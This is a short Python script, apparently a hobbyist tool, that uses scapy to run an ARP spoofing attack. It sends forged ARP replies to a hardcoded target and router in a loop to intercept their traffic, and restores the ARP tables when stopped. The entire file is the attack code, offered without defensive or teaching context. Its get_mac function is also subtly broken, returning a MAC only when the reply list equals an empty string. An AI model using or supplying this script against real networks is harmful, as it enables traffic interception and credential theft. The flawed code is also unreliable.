import scapy.all as scapy
import time

def get_mac(ip):  ####scapy.arping(ip)
  arp_request = scapy.ARP(pdst=ip)
  source_destination = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
  final = source_destination/arp_request
  answered_list = scapy.srp(final, timeout=1, verbose=False)[0]
  if answered_list == "":
    return answered_list[0][1].hwsrc



def send_packet(target_ip, spoof_ip):
    mac = get_mac(target_ip)
    packet = scapy.ARP(pdst=target_ip, hwdst=mac, op=2, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
  destination_mac = get_mac(destination_ip)
  source_mac = get_mac(source_ip)
  packet = scapy.ARP(pdst=destination_ip, hwdst=destination_mac, op=2, psrc=source_ip, hwsrc=source_mac)
  scapy.send(packet, count=4, verbose=False)


target_ip ="192.168.241.161"
router_ip= "192.168.241.117"
send_packet_value = 0
try:
  while True:
    send_packet(target_ip , router_ip)
    send_packet(router_ip , target_ip)
    send_packet_value = send_packet_value + 2
    print("\rPacket Sended : " + str(send_packet_value), end="")
    time.sleep(2)

except KeyboardInterrupt:
  print("\n[+] Quitting....  Restoring ARP Tables Please Wait")
  restore(target_ip, router_ip)
  restore(router_ip, target_ip)
